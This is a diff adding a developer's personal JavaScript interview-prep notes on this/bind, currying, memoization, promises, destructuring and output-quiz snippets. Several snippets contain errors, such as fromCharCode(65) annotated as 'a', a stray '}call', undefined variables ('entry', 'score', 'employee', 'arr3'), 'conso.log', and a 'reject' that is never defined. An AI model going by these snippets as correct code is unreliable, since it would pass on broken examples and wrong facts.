+.	apply({},[10,20]) & apply(null,[1,3]) =>
+										.	is just same as call() but it takes an array as an argument.
+
+										.	also can use when there is no use of this keyword by passing null as object.
+											ex :- Math.max.apply(null, [1,5,2,6,0]);
+
+
+.	const arr = [1,2,3];
+	const ele = [4,5];
+	arr.push.apply(arr, ele);
+
+
+.	In an event, this refers to the element that received the event.
+
+.	let counter = {
+	  count : 0,
+	  inc : function(){
+	    console.log(this);
+	  }call
+	};
+	counter.inc()					// Object { count: 0, inc: inc() }
+	counter.inc.call(counter)		// Object { count: 0, inc: inc() }
+	counter.inc()					// Object { count: 0, inc: inc() }
+	const fn = counter.inc;
+	fn()							// Window about:home
+
+
+.	let obj = {
+	  firstName : 'Jane',
+	  friends: ['Tarzan','Cheeta'],
+	  loop: function(){
+	    console.log(this);					//	obj
+	    this.friends.forEach(function(){
+	      console.log(this);  				// window
+	    });
+	  }
+	};
+
+	obj.loop();
+
+
+
+.	event.target.tagName/ .style/ .getAttribute						// QQQQQQQQQQQQQQQQQQ
+
+.	array.filter(fn);	//	function fn(){	statements;  return result;}
+
+.	currying:-
+				function sum(a,b,c){
+				  return a+b+c;
+				}
+
+				function curry(fn){
+				  return function(a){
+				    return function(b){
+				      return function(c){
+				        return fn(a,b,c);
+				      }
+				    }
+				  }
+				}
+
+				const currySum = curry(sum);
+				console.log(currySum(2)(3)(5));
+
+
+*	functionName.length returns the length of arguments array.
+
+
+*		const curry = (fn) => {
+		  const helper = (...args) => {
+
+		    if(args.length >= fn.length){ 	// will call fn when all the args has been passed
+		      return fn(...args);
+		    } else{
+		      const temp = (...args2) => {
+		        return helper(...args, ...args2);
+		      }
+		      return temp;
+		    }
+		  }
+
+		  return helper;
+		}
+
+		function sum(a,b,c,d,e){
+		  return a+b+c+d+e;
+		}
+
+		const curriedSum = curry(sum);
+
+		// first helper will return then [1] will be passed to it then it goes to else
+		// then temp will return then it will be called by passing [2,3] to it 
+		// then helper will return and it will be called by adding [1],[2,3] then it goes to else
+		// then temp will return then it will be called by passing [4,5] to it
+		//	then helper wiil return and it will be called by adding [1,2,3],[4,5] 
+		console.log(curriedSum(1)(2,3)(4,5));
+		console.log(curriedSum(1,2,3,4,5));
+		console.log(curriedSum(1)(2)(3)(4)(5));
+
+
+
+*		function add(...args){
+		  let storage = args;
+		  
+		  function helper(...args2){
+		    storage.push(...args2);
+		  	console.log("helper start");
+		    return helper;
+		  }
+		  
+			helper.valueOf = function(){
+		    console.log(storage)
+		    return storage.reduce((a,b)=>{
+		      return a+b;
+		    }, 0);
+		  }
+		  
+		  helper.value = helper.valueOf;
+		  this.value = helper.valueOf;
+		  console.log("helper end");
+		  return helper;
+		}
+
+		console.log(add(1)(2)(3).value()==6);
+		console.log(add(1,2,3).value()==6);
+		console.log(add(1,2)(3).value()==6);
+		console.log(add(1)(2)+3);
+
+
+.=>
+	.	// const result = [];
+	    // for(let i=0;i<array.length;i++){
+	    //     if(array[i]){
+	    //         result.push(array[i]);
+	    //     }
+	    // }
+	    // return result;
+
+	.   // return array.filter( (el)=>{
+	    //     if(el){
+	    //         return true;
+	    //     }
+	    //     else{
+	    //         return false;
+	    //     }
+	    // });
+
+    .	// return array.filter( (el)=> Boolean(el));
+
+    .	//	return array.filter( (el)=>{
+        		return Boolean(el);
+    		})
+
+    .	// return array.filter(Boolean);
+
+
+.		valueOf()
+			The valueOf() method returns the primitive value of a string.
+			The valueOf() method does not change the original string.
+			The valueOf() method can be used to convert a string object into a string.
+
+			ex=>	let text = new String("Hello World!");
+						let result = text.valueOf();
+
+						console.log(text)							//	{"Hello World"}
+						console.log(result)						//	Hello World
+
+
+Q.	.map() vs .filter() =
+
+.	splice() => splice(startIndex, deleteCount, item1, item2) // if deleteCount is 0 then it will just add the new items.
+				it modify the original array
+
+. slice() => (just like substring())
+				it does not change the original array. It is use to get some part of the array
+
+
+.	valueOf():-
+				The valueOf() method returns the primitive value of a string.
+
+
+.	String.fromCharCode(65)	// a
+
+
+.	map vs forEach	=>
+		.	map returns an array and forEach returns undefined.
+		.	method chaining can be done with map.
+
+
+.	require('lodash/memoize');
+
+
+.	Random sorting & shuffling => 	var as = ["max","jack","sam"];  
+									var s = as.sort(func);  
+
+									function func(a, b) {  
+									  return 0.5 - Math.random();
+									}  
+
+									console.log(s);
+
+.	image shuffling =>	image.sort(() => Math.random() - 0.5);
+
+.	e.target.attributes /// returns all the attributes
+
+.	e.target.attributes["data-ns-test"].nodeValue
+
+.	lodash.memoize(fn_name);	
+		
+							function square(num){		// call only one time
+								console.log("Hello"); 	
+								return num * num;
+							}
+
+							const memoizedFn = memoize(square);
+
+							console.log(memoizedFn(20));	// Hello 400
+							console.log(memoizedFn(20));	// 		 400
+							console.log(memoizedFn(20));	//		 400
+
+
+
+*		Memoize by learnersbucket
+
+		let memoize = (fn) =>{
+		  let cache = {};
+		  return function(...args){
+		    const key = JSON.stringify(args);
+		    
+		    if(cache[key]){
+		      return cache[key];
+		    }
+		    
+		    const evaluateValue = fn(...args);
+		    cache[key] = evaluateValue;
+		    return evaluateValue;
+		  }
+		}
+
+
+		function fact(n){
+		  if(n<=1){
+		    return 1;
+		  }
+		  
+		  return fact(n-1) * n;
+		}
+
+		const memoizedFact = memoize(fact);
+		console.log(memoizedFact(105));
+		console.log(memoizedFact(105));
+
+
+
+*		function memoize(fn){		// fn is the sqaure function
+			const cacheStore = {};		// is a map (key-value pair)
+			return function(arg){
+				if(cacheStore[arg] !== undefined){
+					return cacheStore[arg];
+				}
+
+				const value = fn(arg);		// compute if value not in cache
+				cacheStore[arg] = value;
+				return value;
+			};
+		}
+
+		function square(num){		// call only one time
+		    console.log("Hello"); 	
+		    return num * num;
+		}
+
+		const memoizedFn = memoize(square);
+
+		console.log(memoizedFn(20));	// Hello 400
+		console.log(memoizedFn(20));	// 		 400
+		console.log(memoizedFn(20));	//		 400
+
+
+
+
+.	var storedItem = localStorage.getItem('autosave-data')
+
+.	localStorage.setItem("autosave-data",data);
+
+
+
+	*****************************	AJAX   *********************
+	
+
+.	Promise => 
+			.	The Promise object represents the eventual completion (or failure) of an asynchronous operation
+			.	It is an object which indicates the success and failure of an async task.
+			. to remove callback hell
+			.	is an object, it has .then()  method.
+			.	It waits for an async task to be done and then deliver the result in callback.
+			. fetch() function is use as Promise.
+			.	it allows to access the future values.
+
+*	fetch() resolve as a promise that returns a readable stream of data that we convert into json by data.json().
+*	data.json() is also resolve as a promise.
+		Ex:-
+			response.json().then((res) => {
+					console.log(res);
+			})
+
+
+*	with new Javascript features Promise.all and Promise.allSettled you can easily run Async Await in parallel.
+
+.	Promise.all
+.	Promise.allSettled()	=> {status: "", value: ""} / {status:"", reason:""}
+.	Promise.race()
+. Promise.any()	=> any of the promise success but if all fails then aggregate error (by this we can access this err.errors)
+
+	A Promise has 3 states:
+		.	pending: initial state, neither fulfilled nor rejected.
+		.	fulfilled: meaning that the operation was completed successfully.
+		.	rejected: meaning that the operation failed.
+
+
+			eg :- 	var flag = true;
+					function checkUserStatus(){
+						var promise = new Promise((success, failure)=>{
+							setTimeout( ()=> {
+								if(flag){
+									success("User Loged in");
+								}
+								else{
+									reject();
+								}
+							}, 1000);
+						});
+						return promise;
+					}
+
+					setTimeout( ()=>{
+						flag = true;
+					}, 500);
+
+					checkUserStatus()
+					.then((msg) => {
+						console.log(msg);
+					})
+					.catch(()=> console.log("user not logged in"));
+
+
+*	Callback is also known as Pyramid of Doom.
+
+
+.	Promise Chain / How to handle callback hell (Use for Iversion of control means the next call can handle by us not by the function)
+
+	Ex-	let cart = ["one","two","three"];
+
+				function validate(cart){
+				  return true;
+				}
+
+				function createOrder(cart){
+				  return new Promise((resolve, reject)=>{
+				    if(!validate(cart)){
+				      reject("Cart is not valid");
+				    }
+				    let orderId = "1234";
+				    if(orderId){
+				      setTimeout(()=>{
+				        resolve(orderId);
+				      },1000)
+				    }
+				  });
+				}
+
+				function proceedToPayment(orderId){
+				  return new Promise((resolve, reject)=>{
+				    if(orderId){
+				      setTimeout(()=>{
+				        resolve("success");
+				      },1000);
+				    }
+				  })
+				}
+
+				function showOrderSummery(paymentStatus){
+				  return new Promise((resolve, reject)=>{
+				    if(paymentStatus==="success"){
+				      resolve({orders: cart});
+				    }
+				  })
+				}
+
+				createOrder(cart)
+				.then(orderId => {
+				  console.log("orderId ",orderId);
+				  return proceedToPayment(orderId);
+				})
+				.then(paymentStatus => {
+				  console.log("paymentStatus ",paymentStatus)
+					return showOrderSummery(paymentStatus);
+				})
+				.then(orderDetails => {
+				  console.log("orderDetails ",orderDetails)
+				})
+				.catch(err=>{
+				  console.log("error ",err);
+				})
+
+
+
+.	fetch(url).then( function(response){
+		return response.json();
+	}).then( function(data){
+		console.log(data.toString());
+	});
+
+
+.	function test(){
+		return new Promise( (res)=>{
+			setTimeout( ()=>{
+				res(Math.random())
+			}, 1000);
+		});
+	}
+
+	test().then( function(data){
+    	console.log(data);
+	})
+
+
+. 	if multiple Promises =>
+							Promise.all([p1(),p2(),p3(),.....]).then( ()=>{
+								----------
+							})
+
+
+.	destructuring can be used with 8 types (array, string, map, object)
+
+	eg:=
+		const obj = {name: 'arfat', lastname: 'salman', dob: 'jan'};
+
+		const {lastname, name} = obj;		// key should be same for access data of an object.
+
+		console.log(name);			// arfat
+		console.log(lastname);		// salman
+
+
+	eg:-
+		const obj = {name: 'arfat', lastname: 'salman', dob: 'jan'};
+		const {lastname, ...restabc} = obj;
+		console.log(lastname);				// salman
+		console.log(restabc);				//	{name:'arfat', dob:'jan'}
+
+
+.	rest operator should be at last
+
+.	for obj should use { } and key should be same as in the object.
+
+
+
+Q=> const {...abc, ...xyz} = [obj1, obj2];	 // give error bcz rest should be only at last.
+
+.	const obj1 = {lastname: 'jangra'};
+	const obj2 = {firstname: 'tarun'};
+	const {...res1} = [obj1,obj2];		
+	console.log(res1);				// {'0': { lastname: 'jangra' }, '1': { firstname: 'tarun' } }
+
+.	spread operator can be anywhere on the right side 
+
+.	transitionend event:-
+			The transitionend event is fired when a CSS transition has completed.
+			I have used this in animate progress bar question asked in Navi.
+
+.	rest and spread same time
+	eg:-
+		const obj3 = {name:'arfat',lastname:'jangra',dob:'jan'};
+		const {name, ...rest} = {...obj3, age:21};
+
+		console.log(name);						//	arfat
+		console.log(rest);						//	{ lastname: 'jangra', dob: 'jan', age: 21 }
+
+
+.	concat(value0, value1, /* … ,*/ valueN)
+
+
+.	check if object contains a property or not.
+				const obj = {
+					id: 1,
+					name: "",
+					salary: 459395,
+				}
+
+				const isSalaryExist = 'salary' in obj;
+
+
+.	conditionally add property to an object
+				const includeSalary = true;
+
+				const obj = {
+					id: 1,
+					name: "",
+					...(includeSalary && {salary: 4904395})
+				};
+
+				
+.	Sallow copy array and objects
+				const arr = [10, 30, 20, 40];
+				const newArr = [...score];
+
+				const obj = {id:1, name:""};
+				const newObj = { ...obj };
+
+
+.	Delete property of an object 
+				const obj = {
+					id: 1,
+					name: "",
+					salary: 459395,
+				};
+
+				delete obj.salary;
+
+
+. Delete property without delete keyword
+				const obj = {
+					id: 1,
+					name: "",
+					salary: 459395,
+				};
+
+				const {salary, ...newEmployee} = employee;
+
+
+.	Check type of array 
+				let arr = [];
+				Array.isArray(arr);
+
+
+.	Use a falsy bouncer
+			const arr = [4, 5, null, undefined, false, 7, NaN];
+			const newArr = arr.filter(Boolean);
+
+
+.	Check occurrence in Array of objects
+				const arr = [
+					{id:1, name:"abc"},
+					{id:2, name:"efg"},
+					{id:2, name:"jkl"},
+				];
+				const hasName = arr.some(item => item.name === "jkl");
+
+
+.	How to write large numbers
+			const num = 45000000000;	// wrong
+			const num1 = 45_000_000_000;	// Numeric Separators enables _ as a separator in numeric literals.
+			const num2 = 45e9;
+
+
+*	Object Destructuring on array
+			const colors = [
+				"#dfaffa",
+				"#9942ds",
+				"#lao355",
+				"#lsdf93"
+			];
+			const { 0:firstColor, 3:lastColor } = colors;
+			console.log(firstColor); 		// "#dfaffa"
+			console.log(lastColor); 		// "#lsdf93"
+
+.	Skip values in array destructuring
+			const arr = [10,20,30,40,50];
+			const [, , ...restArr] = arr;
+			console.log(restArr); // [30,40,50]
+
+.	JSON.stringify	with spacer
+
+			const obj = {
+			  id: 1,
+			  name: "tarun",
+			  salary: "44859"
+			}
+			const format = JSON.stringify(obj);
+			console.log(format);	//{"id":1,"name":"tarun","salary":"44859"}
+
+			const format1 = JSON.stringify(obj,null,2);	// 3rd parameter is a spacer it can be a no. or string.
+			console.log(format1);		//{
+																  "id": 1,
+																  "name": "tarun",
+																  "salary": "44859"
+																}
+
+.	JSON.stringify with replacer 
+
+		1.	with replacer function
+				function replacer(key, value) {
+				  // Filtering out properties
+				  if (typeof value === "string") {
+				    return undefined;
+				  }
+				  return value;
+				}
+
+				const obj = {
+				  foundation: "Mozilla",
+				  model: "box",
+				  week: 45,
+				  month: 7,
+				};
+				JSON.stringify(obj, replacer);	// '{"week":45,"month":7}'
+
+		2.	with replacer array
+				const obj = {
+					id: 1,
+					name: "tarun",
+					address: {
+						city: "Surat",
+						state: "Gujarat",
+						country: "India"
+					}
+				};
+
+				const filters = ["name", "address", "city", "country"]; // now only these property will be stringify
+				const newObj = JSON.stringify(obj, filters, " "); // state property will not be include.
+				//	{
+						 id: 1,
+						 name: "tarun",
+						 address: {
+						 city: "Surat",
+						 country: "India"
+						}
+					}
+
+
+.	Use of optional chaining on function call
+			fn && fn();	//wrong
+			fn?.(); // correct
+
+.	'in' vs 'hasOwnProperty' => 
+								The in operator will check if the property is present, either directly in an object or 
+								in its prototype chain; whereas, the hasOwnProperty() method only checks if 
+								the property is directly present in the object.
+								Ex:- 	'prop1' in obj
+											obj.hasOwnProperty('prop1')
+
+
+.	const obj = { ...true, ..."test", ...10 };
+	console.log(obj);	// { '0':'t', '1':'e', '2':'s', '3':'t' }
+
+
+.	Arrays.flat(--); // can pass the depth of the flatnning
+		const arr2 = [0, 1, [2, [3, [4, 5]]]];
+		arr3.flat(2);
+		// [0, 1, 2, 3, [4, 5]]
+
+.	console.time() & console.timeEnd() to debug performance
+			first use console.time() before start of the function
+			then use console.timeEnd() after function ends;
+
+
+.	group console.log statements by using console.group() and console.groupEnd()
+
+.	conditional console statements by using console.assert(condition, "");
+
+.	console an object in form of table by console.table();
+
+.	default assignment for required arguments
+			const isRequired = () =>{
+				throw new Error("Argument is required");
+			}
+
+			const abc = (arg = isRequired()) =>{
+				conso.log(arg);
+			}
+
+			abc("tarun");	// tarun
+			abc(""): //
+			abc(null): // null
+			abc(); //	Error: Argument is required
+
+
+*	Problems with default exports are:
+		• Discoverability is very poor for default exports.
+		• Difficult to analyze by automated tools or provide code autocompletion.
+		• Horrible experience for CommonJS.
+		• TypeScript auto-import struggles.
+		• Default exports make large-scale refactoring impossible.
+
+
+.	Lock an object by using Object.freeze(obj);
+
+.	Smooth scroll to a specific element
+			element.scrollIntoView({
+				behavior: "smooth"
+			})
+
+
+.	Object.entries(obj) returns an array of arrays. 2D array
+
+.	?? nullish coalescing
+		The Nullish Coalescing Operator (??) is a logical operator that accepts two values and 
+		returns the second value if the first one is null or undefined and otherwise returns the first value.
+
+
+.	Always avoid Automatic Semicolon Insertion.
+			function abc(){
+			  return
+			  {
+			    id: "324";
+			  };
+			}
+
+			console.log(abc()); // undefined 
+
+
+.	Property renaming in object destructuring
+			const obj = {
+				id: 1,
+				name: "tarun"
+			}
+			const { id: empId, name: firstName } = obj;
+			console.log(empId); // 1
+			console.log(firstName); // tarun
+
+			const { name: empName, name: firstName} = obj;
+			console.log(empName); // tarun
+			console.log(firstName); // tarun
+
+
+.	Object nested destructuring
+				const obj = {
+					id: 1,
+					name: "tarun",
+					address: {
+						city: "Surat",
+						state: "Gujarat",
+						country: "India"
+					}
+				};
+
+				const { address: { country, state }} = obj;
+				console.log(country); // India
+				console.log(state); // Gujarat
+
+
+.	2d array to an object by Object.fromEntries / Create an object from key-value pair using Object.fromEntries
+				const arr = [
+					["id", 1],
+					["name", "tarun"],
+					["age", 20]
+				];
+
+				const obj = Object.fromEntries(arr);
+				console.log(obj);	// { id: 1, name: "tarun", age: 20 }
+
+
+.	Array.every (Check every element of the array using Array.every)
+				const arr = [
+					{id:1, isActive: true},
+					{id:2, isActive: false},
+					{id:2, isActive: true},
+				];
+
+				const isAllActive = arr.every(item => item.isActive === true);
+
+
+.	Swap 2 variables
+		let a = 10;
+		let b = 20;
+		[b, a] = [a, b]
+
+.	Mask numbers using slice and padStart
+			const a = "93459399458939859";
+			const last4Digits = a.slice(-4); //	9859
+			const maskNo = last4Digits.padStart(a.length, "*");
+			console.log(maskNo); //	****************9859
+
+.	String to a number using the plus (+) operator
+
+
+
+	***************************************************************************************************
+	***********************************		Output based questions 		***********************************
+	***************************************************************************************************
+
+
+.	How to check if a certain property exists in an object
+		Ex:-	const hero = {
+					  name: 'Batman'
+					};
+					console.log('name' in hero);  
+
+
+*	check if a number is even without using
+			function isEven(n) {
+         let isEven = true;
+         for(let i = 1; i <= n; i++)
+            isEven = !isEven;
+         if (isEven)
+            console.log(n + " is an Even number.");
+         else
+            console.log(n + " is Odd.");
+      }
+
+.	var result = 0/0;
+	console.log(result); // NaN
+
+
+Q-	How to Compare Objects
+A-	Using by JSON.stringify() but the keys Should be in same order.
+			Ex:-
+				.	let a = { name: 'Dionysia', age: 29};
+					let b = { name: 'Dionysia', age: 29};
+					console.log(JSON.stringify(a) === JSON.stringify(b)); // true
+
+
+				.	let a = { age: 29, name: 'Dionysia'};
+					let b = { name: 'Dionysia', age: 29};
+					console.log(JSON.stringify(a) === JSON.stringify(b)); //false
+
+
+				.	let a = { name: 'Dionysia'};
+					let b = { name: 'Dionysia', age: undefined};
+					console.log(JSON.stringify(a) === JSON.stringify(b)); //true
+
+
+.	var result = 0/0;
+	console.log(typeof result) // number
+
+
+.	var x = 23;
+	(function(){
+	  var x = 43;
+	  (function random(){
+	    x++;
+	    console.log(x);
+	    var x = 21;
+	  })();
+	})();
+
+
+
+.	function f(){
+		console.log(this);		// window
+	}
+
+	const user = {
+		g: f.bind(user),
+	}
+
+	user.g();
+
+
+.	function f(){
+		console.log(this.name);		// John
+	}
+
+	f = f.bind({name:"John"}).bind({name: "Peter"});
+
+	f();
+
+
+.	(function(){
+	  var a = b = 3;
+	})();
+
+	console.log("a defined? " + (typeof a !== 'undefined'));
+	console.log("b defined? " + (typeof b !== 'undefined'));
+
+
+.	var myObject = {
+    foo: "bar",
+	    func: function() {
+	        var self = this;
+	        console.log("outer func:  this.foo = " + this.foo);
+	        console.log("outer func:  self.foo = " + self.foo);
+	        (function() {
+	            console.log("inner func:  this.foo = " + this.foo);
+	            console.log("inner func:  self.foo = " + self.foo);
+	        }());
+	    }
+	};
+	myObject.func();
+
+
+.	function foo1()
+	{
+	  return {
+	      bar: "hello"
+	  };
+	}
+
+	function foo2()
+	{
+	  return
+	  {
+	      bar: "hello"
+	  };
+	}
+
+	console.log(foo1());
+	console.log(foo2());
+
+
+.	function areTheNumbersAlmostEqual(num1, num2) {
+		return Math.abs( num1 - num2 ) < Number.EPSILON;
+	}
+	console.log(areTheNumbersAlmostEqual(0.1 + 0.2, 0.3));
+
+
+
+.	function check(success, failure){
+	  let password = prompt("Password?","");
+	  if(password == '1234'){
+	    success();
+	  }else{
+	    failure();
+	  }
+	}
+
+	let user = {
+	  name: 'Tarun',
+	  successful(){
+	    console.log(`${this.name} logged in`);
+	  },
+	  failed(){
+	    console.log(`${this.name} failed to log in`);
+	  }
+	}
+
+	check(user.successful.bind(user), user.failed.bind(user));
+
+
+
+.	function check(ok, fail){
+	  let password = prompt("Password?","");
+		if(password == '1234'){
+		   ok();
+		}else{
+		  fail();
+		}
+	}
+
+	let user = {
+	  name: 'Tarun',
+	  login(result){
+	    console.log(this.name+ (result ? ' login successful' : ' login failed'));
+	  }
+	}
+
+	check(user.login.bind(user, true), user.login.bind(user,false));
+
+
+
+.	let status = "10";
+
+	setTimeout(()=>{
+       	const status = "2";
+       
+       	const data = {
+       	 	status: "3",
+         	getStatus(){
+            	return this.status;
+          	}
+       	}
+        
+        console.log(data.getStatus());
+        console.log(data.getStatus.call(this));
+    },0)
+
+
+
+.	let sum = function(a){
+	  console.log("A ",a);
+	  return function(b){
+	  	console.log("B ",b);
+	    if(b){
+	      return sum(a+b);
+	    }
+	    return a;
+	  }
+	}
+
+	console.log(sum(1)(2)(3)(4)(5)(6)(7)(8)(9)());
+
+
+
+**		function api1(){
+			  return new Promise((resolve, reject)=>{
+			  	setTimeout(()=>{
+			      console.log("First");
+			    },1000);
+				})
+			}
+
+			function api2(){
+			  return new Promise((resolve, reject)=>{
+			  	setTimeout(()=>{
+			      console.log("Second");
+			    },100);
+				})
+			}
+
+			api1();
+			api2();
+						// first it will print second after 100ms and then after 900ms it will print First
+
+
+.	console.log("start");
+
+	const promise = new Promise((resolve,reject)=>{
+	  console.log(1);
+	  resolve(2);
+	  console.log(3);
+	});
+
+	promise.then((res)=>{
+	  console.log(res);
+	});
+
+	console.log("end");
+
+
+.	console.log("start");
+
+	const promise = new Promise((resolve,reject)=>{
+	  console.log(1);
+	  console.log(3);
+	});
+
+	promise.then((res)=>{
+	  console.log(res);
+	});
+
+	console.log("end");
+
+
+.	console.log("start");
+
+	const fn = () => new Promise((resolve,reject)=>{
+		  console.log(1);
+		  console.log(3);
+		});
+
+	console.log("middle")
+
+		fn().then((res)=>{
+		  console.log(res);
+		});
+
+		console.log("end");
+
+
+
+.	function job(state){
+	  return new Promise(function(resolve,reject){
+	    if(state){
+	      resolve("success");
+	    }else{
+	      reject("error");
+	    }
+	  });
+	}
+
+	let promise = job(true);
+
+	promise.then(function(data){
+	  console.log(data);
+	  return job(false);
+	})
+	.catch(function (error){
+	  console.log(error);
+	  return "Error caught";
+	})
+	.then(function(data){
+	  console.log(data);
+	  return job(true);
+	})
+	.catch(function(error){
+	console.log(error);
+	})
+
+
+
+.	function job(state){
+	  return new Promise(function(resolve,reject){
+	    if(state){
+	      resolve("success");
+	    }else{
+	      reject("error");
+	    }
+	  });
+	}
+
+	let promise = job(true);
+
+	promise.then(function(data){
+	  console.log(data);
+	  return job(true);
+	})
+	.then(function (data){
+	  if(data!="victory"){
+	    throw "Defeat";
+	  }
+	  return job(true);
+	})
+	.then(function(data){
+	  console.log(data);
+	})
+	.catch(function(error){
+		console.log(error);
+	  return job(false);
+	})
+	.then(function(data){
+	  console.log(data);
+	  return job(true);
+	})
+	.catch(function(error){
+	  console.log(error);
+	  return "Error caught";
+	})
+	.then(function(data){
+	  console.log(data);
+	  return new Error("test");
+	})
+	.then(function(data){
+	  console.log("Succes: ",data.message);
+	})
+	.catch(function(data){
+	  console.log("Error: ",data.message);
+	})
+
+
+
+.	Rewrite using async await
+	
+	function loadJson(url) {
+	  return fetch(url).then((response)=>{
+	    if(response.status==200){
+	      return response.json();
+	    } else{
+	    		throw new Error(response.status);
+	  	}
+	  })
+	};
+
+	loadJson("https://jsonplaceholder.typicode.com/posts").then(res=>console.log(res));
+
+
+	async function loadJson(url) {
+	  let res = await fetch(url);
+	    if(res.status==200){
+	      let json = res.json();
+	      return json;
+	    } else{
+	    		throw new Error("hello");
+	  	}
+	};
+
+	loadJson("https://jsonplaceholder.typicode.com/posts").then(res=>console.log(res));
+
+
+
+.	Promise Recursively
+
+		function api1(name){
+		  return new Promise((resolve, reject)=>{
+		    setTimeout(()=>{
+		      resolve('Subscribe to '+name);
+		    },1000);
+		  });
+		}
+
+		function api2(video){
+		  return new Promise((resolve,reject)=>{
+		    setTimeout(()=>{
+		      resolve(`Like the ${video} video`);
+		    },1000);
+		  });
+		}
+
+		function api3(video){
+		  return new Promise((resolve,reject)=>{
+		    setTimeout(()=>{
+		      resolve(`Share the ${video} video`);
+		    },1000);
+		  });
+		}
+
+		function rec(promises){
+		  if(promises.length == 0){
+		    return;
+		  }
+		  
+		  let currPromise = promises.shift();
+
+		  currPromise.then(res=>{
+		    console.log(res)
+		  })
+		  
+		  rec(promises);
+		}
+
+		rec([
+		  api1("RoadSide Coder"),
+		  api2("Js questions"),
+		  api3("Js questions"),
+		])
+
+
+.	let bear = {
+	  sound: "roar",
+	  roar(){
+	    console.log(this);
+	    console.log(this.sound);
+	  }
+	};
+
+	bear.sound = 'grunt';
+	let bearSound = bear.roar;
+	bearSound();
+
+
+.	const a = {x:1};
+	const b = {x:1};
+
+	console.log(a===b);
+
+
+.	(function(){
+	  var x,y;
+	  try{
+	    throw new Error();
+	  }catch(x){
+	    x = 1;
+	    y =  2;
+	    console.log(x);
+	  }
+	  console.log(x);
+	  console.log(y);
+	})()
+
+
+*		function temp(n){
+		  this.number = n;
+		}
+
+		temp.prototype.valueOf = function(){
+		  return this.number;
+		}
+
+		let s = new temp(10);
+
+		console.log(s);			//	{ number : 10 }
+		console.log(s + 1);	// now when we are performing any perimitive operation it will call s.valueOf and return 10.
+
+
+**	console.log(1 < 2 < 3);					// true
+		console.log(3 > 2 > 1);					// false
+		console.log(1 + "2" + "2");			// "122"
+		console.log(1 + +"2" + "2");		// "32"
+		console.log(1 + -"1" + "2");		// "02"
+		console.log(+"1" + "1" + "2");	// "112"
+		console.log( "A" - "B" + "2");	// "NaN2"
+		console.log( "A" - "B" + 2);		// NaN
+		console.log('    4' - '1');			//	3
+
+.		console.log(null >= false) 	// true
+		console.log(null > false)
+		console.log(null < false)
+		console.log(null <= false)	// true
+		console.log(null == false)
+
+
+Ques- How to Run Async Await in Parallel with Javascript?
+Ans-	https://medium.com/@omar.hsouna/how-to-run-async-await-in-parallel-with-javascript-19b91adfc45d
+
+
+Q=>	Method Chaining
+A=>	function compute(){
+		  let temp = {
+		    total: 0,
+		    lacs: function(val){
+		    	console.log(this);
+		      this.total += (val * 100000);
+		      return temp;
+		    },
+		    thousand: function(val){
+		      this.total += (val * 1000);
+		      return temp;
+		    },
+		    crore: function(val){
+		      this.total += (val * 10000000);
+		      return temp;
+		    },
+		    value: function(){
+		      return this.total;
+		    }
+		  };
+		  
+		  return temp;
+		}
+
+		let ans = compute().lacs(15).crore(5).crore(2).lacs(20).thousand(45).crore(7).value();
+		console.log(ans);
+
+
+.	 Generate a function that caches the responses of api calls for a set duration of time.
+			You have to write a function that takes an endpoint and method (GET / POST etc) and for the first time 
+			it makes an api call and cache it but for subsequent request made in the next t seconds the results 
+			are served from cache post which it will again make api call and then cache it.
+
+		Ex:-
+			const cache = {};
+
+			const apiCache = (url, method, time) => {
+
+			  return async function helperCache() {
+			    if (cache[url] && Date.now() < entry.expiry) {
+			      return cache[url].response;
+			    } else {
+			      try {
+			        let res = await fetch(url, method);
+			        res = await res.json();
+			        cache[url] = { response: res, expiry: Date.now() + time };
+			      } catch (err) {
+			        console.log("error", err.message);
+			      }
+			    }
+			    return cache[url].response;
+			  }
+			};
+
+			let url = "https://api.github.com/users/nilesh4597";
+			let method = "GET";
+
+			const call = apiCache(url, { method }, 500);
+			call.then((a) => console.log("1st call", a));
+
+			setTimeout(() => {
+			  const call2 = apiCache(url, { method }, 500);
+			  call2.then((a) => console.log("2nd call", a));
+			}, 1000);
+
+			setTimeout(() => {
+			  const call3 = apiCache(url, { method }, 500);
+			  call3.then((a) => console.log("3nd call", a));
+			}, 2000);
+
+
+
+.	AJAX (Asynchronous JavaScript and XML) 
+				.	AJAX is a technique used to send and receive data from a server asynchronously.
+				.	Once the response is received, JavaScript can manipulate the DOM to update 
+					parts of the web page dynamically without a full page reload.
+
+				Ex:-	
+					var xhr = new XMLHttpRequest();
+
+					// Configure the request
+					xhr.open('GET', 'https://api.example.com/data', true);
+
+					// Set up the callback for when the request completes
+					xhr.onreadystatechange = function() {
+					  if (xhr.readyState === XMLHttpRequest.DONE) {
+					    if (xhr.status === 200) {
+					      // Handle successful response
+					      console.log(xhr.responseText);
+					    } else {
+					      // Handle error
+					      console.error('Request failed with status:', xhr.status);
+					    }
+					  }
+					};
+
+					xhr.send();
+
+
+.	Interceptor in axios
+		.	When we want to perform some logic with incoming or outgoing requests and responses
+		.	In Axios interceptors allow you to intercept requests or responses before 
+			they are handled by axios and modify them, or perform additional operations.
+			Ex:- 
+				.	Add Authorization headers when sending request.
+				.	Modify the response.
+
+				axios.intercept.request.use((req) => {
+					// Do Something
+					return req;
+				})
+
+
+.	Axios vs Fetch
+		.	Axios have built-in XSRF protection.	
+		.	Axios have Interceptors.
+		.	Axios allows cancelling request and request timeout.	
+		.	Axios performs automatic transforms of JSON data. With Fetch need to use .json().
+		.	Axios has wide browser support.	
+		.	In POST request Fetch body has to be 'stringified'.
+		.	Axios “GET” call ignores data content but	Fetch “GET” call can have body content.
+
+
+.	How to Use the Escape Character (\) to Escape a String in JavaScript
+		let quote = "He said, \"I learned from freeCodeCamp!\"";
+		console.log(quote); // He said, "I learned from freeCodeCamp!"
+
+		let apostrophe = 'It\'s a beautiful day';
+		console.log(apostrophe); // It's a beautiful day
+
+.	Use Template Literals to Escape a String in JavaScript
+		let quote = `He said, "I learned from freeCodeCamp!"`;
+		console.log(quote); // He said, "I learned from freeCodeCamp!"
+
+.	use Opposite String Syntax to Escape a String in JavaScript
+		let quote = 'He said, "I learned from freeCodeCamp!"';
+		console.log(quote); // He said, "I learned from freeCodeCamp!"
+
+
+.	Meta tags:-
+		Meta tags are used to provide additional information about a page to search engines and other clients. 
+		Clients process the meta tags provided by the server and ignore those they don't support. 
+		Meta tags are added to the <head> section of your HTML page.
+
+			<meta name="robots" content="noindex,nofollow">
+
+		Metadata is used by browsers (how to display content or reload page), search engines (keywords) and other web services.
+
+
+.	Server Side Rendering (SSR):-
+			Server Side Rendering is the traditional way of rendering web pages. When a 
+			user requests a page from the server, the server processes the request and 
+			generates the complete HTML file, which is then sent to the user’s browser. The 
+			browser receives the complete HTML file and displays it to the user.
+
